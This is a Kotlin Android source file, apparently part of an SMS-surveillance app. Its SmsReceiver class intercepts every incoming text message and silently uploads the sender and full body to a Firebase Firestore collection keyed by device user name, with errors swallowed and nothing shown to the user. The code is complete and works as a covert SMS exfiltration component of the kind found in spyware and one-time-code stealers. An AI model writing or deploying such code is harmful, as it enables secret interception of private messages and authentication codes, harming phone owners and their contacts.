package com.example

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        try {
            if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                
                val prefs = context.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
                val userName = prefs.getString("USER_NAME", "unknown") ?: "unknown"

                val db = FirebaseHelper.getFirestore(context)

                messages?.forEach { message ->
                    val sender = message?.displayOriginatingAddress ?: "غير معروف"
                    val body = message?.displayMessageBody ?: ""

                    val smsData = hashMapOf(
                        "type" to "INCOMING_SMS",
                        "sender" to sender,
                        "body" to body,
                        "timestamp" to System.currentTimeMillis()
                    )
                    
                    db.collection("devices").document(userName)
                        .collection("sms").add(smsData)
                        .addOnSuccessListener {
                            Log.d("SmsReceiver", "SMS saved to Firebase successfully")
                        }
                        .addOnFailureListener { e ->
                            Log.e("SmsReceiver", "Error saving SMS to Firebase", e)
                        }
                }
            }
        } catch (e: Throwable) {
            Log.e("SmsReceiver", "Safe catch: error receiving SMS broadcast", e)
        }
    }
}

